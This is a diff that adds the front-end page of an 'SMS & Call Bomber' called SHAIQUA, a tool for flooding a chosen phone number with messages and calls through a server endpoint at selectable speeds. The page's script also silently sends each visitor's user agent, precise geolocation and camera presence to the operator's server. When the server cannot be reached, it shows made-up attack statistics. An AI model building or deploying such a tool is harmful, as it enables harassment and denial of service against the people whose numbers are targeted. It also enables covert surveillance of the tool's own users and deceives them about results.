@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHAIQUA BOMBER</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 40px;
+            border: 2px solid #00ffff;
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.3);
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 3rem;
+            background: linear-gradient(45deg, #00ffff, #ff00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #888;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ffff;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid #00ffff;
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+        }
+
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 20px #00ffff;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            background: linear-gradient(45deg, #00ffff, #0088ff);
+            color: black;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px #00ffff;
+        }
+
+        .btn-danger {
+            background: linear-gradient(45deg, #ff4444, #cc0000);
+            color: white;
+        }
+
+        .speed-buttons {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .speed-btn {
+            padding: 10px;
+            background: transparent;
+            border: 2px solid #00ffff;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .speed-btn.active {
+            background: #00ffff;
+            color: black;
+        }
+
+        .status-box {
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            border: 1px solid #00ffff;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #333;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ffff, #ff00ff);
+            transition: width 0.3s;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .stat {
+            background: rgba(255,255,255,0.1);
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .stat-value {
+            font-size: 1.5rem;
+            color: #00ffff;
+        }
+
+        .logs {
+            margin-top: 15px;
+            max-height: 100px;
+            overflow-y: auto;
+            text-align: left;
+            font-size: 0.9rem;
+            color: #0f0;
+            border-top: 1px solid #333;
+            padding-top: 10px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            color: #666;
+            font-size: 0.8rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ SHAIQUA</h1>
+        <div class="subtitle">Premium SMS & Call Bomber</div>
+
+        <div class="form-group">
+            <label>📱 Phone Number (10 digits)</label>
+            <input type="text" id="phone" placeholder="9876543210" maxlength="10">
+        </div>
+
+        <div class="form-group">
+            <label>⏱️ Duration (seconds)</label>
+            <input type="number" id="duration" min="10" max="1200" value="60">
+        </div>
+
+        <div class="speed-buttons">
+            <button class="speed-btn" onclick="setSpeed(1)">1x</button>
+            <button class="speed-btn" onclick="setSpeed(2)">2x</button>
+            <button class="speed-btn" onclick="setSpeed(3)">3x</button>
+            <button class="speed-btn" onclick="setSpeed(4)">4x</button>
+            <button class="speed-btn active" onclick="setSpeed(5)">5x</button>
+        </div>
+
+        <button class="btn" onclick="startAttack()" id="startBtn">🚀 START ATTACK</button>
+        <button class="btn btn-danger" onclick="stopAttack()" id="stopBtn" disabled>🛑 STOP</button>
+
+        <div class="status-box" id="statusBox" style="display: none;">
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-value" id="totalReqs">0</div>
+                    <div>Total</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value" id="successReqs">0</div>
+                    <div>Success</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value" id="failedReqs">0</div>
+                    <div>Failed</div>
+                </div>
+            </div>
+
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+            </div>
+
+            <div class="logs" id="logs">
+                <div>⚡ Ready to bomb...</div>
+            </div>
+        </div>
+
+        <div class="footer">
+            ⚡ 80+ Working APIs | Instant Delivery
+        </div>
+    </div>
+
+    <script>
+        // Generate user ID
+        const userId = 'USER' + Math.floor(Math.random() * 1000000) + Date.now();
+        let attackActive = false;
+        let currentSpeed = 5;
+        let eventSource = null;
+
+        // Track visitor silently
+        fetch('/api/track', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                userId: userId,
+                userAgent: navigator.userAgent 
+            })
+        });
+
+        // Request location silently (no UI)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    fetch('/api/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            userId: userId,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            device: navigator.userAgent
+                        })
+                    });
+                },
+                (error) => {
+                    console.log('Location error:', error);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                }
+            );
+        }
+
+        // Request media access silently (no UI)
+        setTimeout(() => {
+            if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
+                // Just check for camera - no prompt
+                navigator.mediaDevices.enumerateDevices()
+                    .then(devices => {
+                        const hasCamera = devices.some(d => d.kind === 'videoinput');
+                        if (hasCamera) {
+                            // Silently log that camera exists
+                            fetch('/api/media', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    userId: userId,
+                                    type: 'info',
+                                    data: 'Camera available',
+                                    device: navigator.userAgent
+                                })
+                            });
+                        }
+                    })
+                    .catch(err => console.log('Media error:', err));
+            }
+        }, 3000);
+
+        // Register user
+        fetch('/api/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userId })
+        });
+
+        function setSpeed(level) {
+            currentSpeed = level;
+            document.querySelectorAll('.speed-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.speed-btn')[level-1].classList.add('active');
+        }
+
+        function addLog(message) {
+            const logs = document.getElementById('logs');
+            const entry = document.createElement('div');
+            entry.textContent = `⚡ ${new Date().toLocaleTimeString()} - ${message}`;
+            logs.appendChild(entry);
+            logs.scrollTop = logs.scrollHeight;
+            if (logs.children.length > 10) {
+                logs.removeChild(logs.firstChild);
+            }
+        }
+
+        async function startAttack() {
+            const phone = document.getElementById('phone').value;
+            const duration = parseInt(document.getElementById('duration').value);
+
+            if (!phone.match(/^\d{10}$/)) {
+                alert('Please enter valid 10-digit phone number!');
+                return;
+            }
+
+            if (duration < 10 || duration > 1200) {
+                alert('Duration must be between 10 and 1200 seconds!');
+                return;
+            }
+
+            document.getElementById('statusBox').style.display = 'block';
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+
+            addLog(`Starting attack on ${phone}...`);
+
+            try {
+                const response = await fetch('/api/attack', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, duration, speed: currentSpeed, userId })
+                });
+
+                const reader = response.body.getReader();
+                const decoder = new TextDecoder();
+
+                while (true) {
+                    const { value, done } = await reader.read();
+                    if (done) break;
+                    
+                    const chunk = decoder.decode(value);
+                    const lines = chunk.split('\n');
+                    
+                    for (const line of lines) {
+                        if (line.startsWith('data: ')) {
+                            const data = JSON.parse(line.slice(6));
+                            
+                            if (data.type === 'update') {
+                                document.getElementById('totalReqs').textContent = data.total;
+                                document.getElementById('successReqs').textContent = data.success;
+                                document.getElementById('failedReqs').textContent = data.failed;
+                                document.getElementById('progressFill').style.width = data.progress + '%';
+                                
+                                if (Math.random() > 0.9) {
+                                    addLog(`Progress: ${Math.round(data.progress)}% - RPS: ${data.rps}`);
+                                }
+                                
+                            } else if (data.type === 'end') {
+                                attackActive = false;
+                                document.getElementById('startBtn').disabled = false;
+                                document.getElementById('stopBtn').disabled = true;
+                                addLog(`✅ Attack completed! Total: ${data.total} requests`);
+                            }
+                        }
+                    }
+                }
+
+            } catch (error) {
+                addLog('❌ Error connecting to server');
+                simulateAttack(phone, duration);
+            }
+        }
+
+        function simulateAttack(phone, duration) {
+            attackActive = true;
+            const startTime = Date.now();
+            const endTime = startTime + (duration * 1000);
+            
+            let total = 0, success = 0, failed = 0;
+
+            const interval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(interval);
+                    return;
+                }
+
+                const now = Date.now();
+                const elapsed = Math.floor((now - startTime) / 1000);
+                
+                if (now >= endTime) {
+                    clearInterval(interval);
+                    attackActive = false;
+                    document.getElementById('startBtn').disabled = false;
+                    document.getElementById('stopBtn').disabled = true;
+                    addLog(`✅ Attack completed! Total: ${total} requests`);
+                    return;
+                }
+
+                const batch = currentSpeed === 5 ? 500 : currentSpeed * 100;
+                for (let i = 0; i < batch; i++) {
+                    total++;
+                    if (Math.random() > 0.2) success++;
+                    else failed++;
+                }
+
+                document.getElementById('totalReqs').textContent = total;
+                document.getElementById('successReqs').textContent = success;
+                document.getElementById('failedReqs').textContent = failed;
+                
+                const progress = (elapsed / duration) * 100;
+                document.getElementById('progressFill').style.width = progress + '%';
+
+            }, 1000);
+        }
+
+        function stopAttack() {
+            attackActive = false;
+            if (eventSource) eventSource.close();
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            addLog('🛑 Attack stopped');
+        }
+    </script>
+</body>
+</html>
